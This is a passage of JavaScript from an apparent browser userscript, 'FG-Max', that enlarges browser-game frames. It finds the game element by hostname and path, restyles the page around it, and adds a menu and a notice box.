			case 'pv_iframe':
			case 'rck_iframe':
			case 'th_iframe':
			case 'ti_iframe':
			case 'wt_iframe':
			case 'yv_iframe':
			case 'zp_iframe':
				self.styles.injectStyles(self.styles.getFlashframeStyles());

			case 'bj':
			case 'bm':
			case 'cl':
			case 'ct':
			case 'cw':
			case 'ft':
			case 'pv_outerframe':
			case 'pw':
			case 'rck':
			case 'th':
			case 'wt':
			case 'yvfb':
			case 'yvyv':
			case 'zp':
				if (jQuery(settings.selector).length > 0) {
					self.manipulateElement(settings.selector);
				} else {
					jQuery(document.body).bind('elementCreated', {
							selector: settings.selector
						}, function(event) {
							self.manipulateElement(settings.selector);
						}
					);
				}
				break;
		}

			// use this only if a valid type was found
		if (self.windowType != null) {
				// create menu if menuitems are available
			if (typeof(settings.menuitems) != 'undefined') {
				self.createMenu(settings);
			}

				// if notice selector is set
			if (typeof(settings.notice) != 'undefined') {
				self.createNoticebox(settings);
			}

				// inject specific styles
			if (typeof(settings.styles) != 'undefined') {
				self.styles.appendStyles(self.styles['get' + settings.styles + 'Styles']());
			}
		}

		return this;
	};

	/**
	 * Initialize the window self
	 *
	 * @param	array
	 * @return	void
	 */
	this.manipulateElement = function(selector) {
		var $element = jQuery(selector)
			.siblings()
				.removeAttr('style')
				.addClass('none')
				.end()
			.parents()
				.siblings()
					.removeAttr('style')
					.addClass('none')
					.end()
				.removeAttr('style')
				.removeAttr('class')
				.css({
					display: 'block',
					height: '100%',
					margin: '0',
					position: 'absolute',
					visibility: 'visible',
					width: '100%'
				})
				.end()
			.removeAttr('height')
			.removeAttr('width')
			.removeAttr('style')
			.removeAttr('class')
			.css({
				display: 'block',
				height: '100%',
				visibility: 'visible',
				width: '100%'
			});

		if (this.windowType.match(/_iframe/)) {
			$element.find('param[name=wmode]').attr('value', 'opaque');
		}

		return $element;
	};


	/**
	 * Get the window type depending on the location of the current window
	 *
	 * @return	string
	 */
	this.getWindowType = function() {
		if (this.windowType == null) {
			var hostname = window.location.hostname,
				pathname = window.location.pathname,
				href = window.location.href;

				// get every game settings and set them as current
			for (var key in SCRIPT.games) {
				var current = SCRIPT.games[key];

					/**
					 * If hostname and pathname is set compare them with current
					 * game settings. If they match use the key as windowType
					 */
				if (hostname != undefined &&
						pathname != undefined &&
						hostname.match(current.hostname) &&
						pathname.match(current.pathname)) {
					this.windowType = key;

						/**
						 * If some exclude path are defined look if they match.
						 * Remove the path and end the check
						 */
					if (typeof(current.exclude) == 'object' &&
							current.exclude.length > 0) {
						var excludeLength = current.exclude.length;

						for (var i = 0; i < excludeLength; i++) {
							if (href.match(current.exclude[i])) {
								this.windowType = null;
								break;
							}
						}
					}
				}
			}
		}

		if (debug && this.windowType != null) {
			console.log(href + " " + this.windowType);
		}

		return this.windowType;
	};

	/**
	 * Creates a menu of links with a button which clicked opens the menu
	 *
	 * @param	menuItems	array with objects containing the url and lable for the menuitems
	 * @return	void
	 */
	this.createMenu = function(settings) {
		var menuItems = settings.menuitems,
			self = this;

		this.styles.injectStyles(this.styles.getMenuStyles());

		var $fvmmMenu = jQuery('<div id="fvmm_menu" />')
				.append(
					jQuery('<div id="fvmm_menubutton"><span>Menu</span></div>')
						.bind('click', function() {
							jQuery(this).next().addClass('show');
						})
						.bind('mouseenter', function() {
							self.timeout_close = clearTimeout(self.timeout_close);
						})
						.bind('mouseleave', function() {
							var $button = jQuery(this);
							self.timeout_close = setTimeout(function() {
								$button.next().removeClass('show');
							}, 500);
						})
				),
				$fvmmList = jQuery('<menu/>')
					.bind('mouseenter', function() {
						self.timeout_close = clearTimeout(self.timeout_close);
					})
					.bind('mouseleave', function() {
						var $menu = jQuery(this);
						self.timeout_close = setTimeout(function() {
							$menu.removeClass('show');
						}, 500);
					})
					.appendTo($fvmmMenu);

		menuItems.push({href: 'http://userscripts.org/scripts/show/73361', label: 'FG-Max for Firefox'});
		menuItems.push({href: 'https://chrome.google.com/extensions/detail/iobhmpojlnigpglpmfahkfembdjelmbf/', label: 'FG-Max for Chrome'});

		for (var index in menuItems) {
			var attributes = menuItems[index];

			if (typeof(attributes.label) == 'string') {
				var label = attributes.label;
				delete(attributes['label']);
			}

			jQuery('<li/>')
				.append(
					jQuery('<a/>', attributes)
						.text(label)
				)
				.appendTo($fvmmList);
		}

		$fvmmMenu.appendTo('body');
	};

	/**
	 * Creates a noticebox if notices are available and appends a button if clicked
	 * will show the message
	 *
	 * @return	void
	 */
	this.createNoticebox = function(settings) {
		var $notices = jQuery(settings.notice);

		this.styles.injectStyles(this.styles.getMessageboxStyles());

		if ($notices.length > 0) {
			var $fvmmNotice = jQuery('<div id="fvmm_notice" />')
					.append(
						jQuery('<div id="fvmm_noticebutton" />')
							.bind('click', function() {
								jQuery(this).next().addClass('show');
							})
							.bind('mouseleave', function() {
								jQuery(this).next().removeClass('show');
							})
					),
				$fvmmNoticeMessages = jQuery('<div class="messages" />')
					.appendTo($fvmmNotice);

			$notices.each(function() {
				$(this)
					.removeAttr('id')
					.removeAttr('class')
					.removeAttr('style')
					.detach()
					.appendTo($fvmmNoticeMessages);
			});

			$fvmmNotice.appendTo('body');
		}
	};


	this.__construct();
}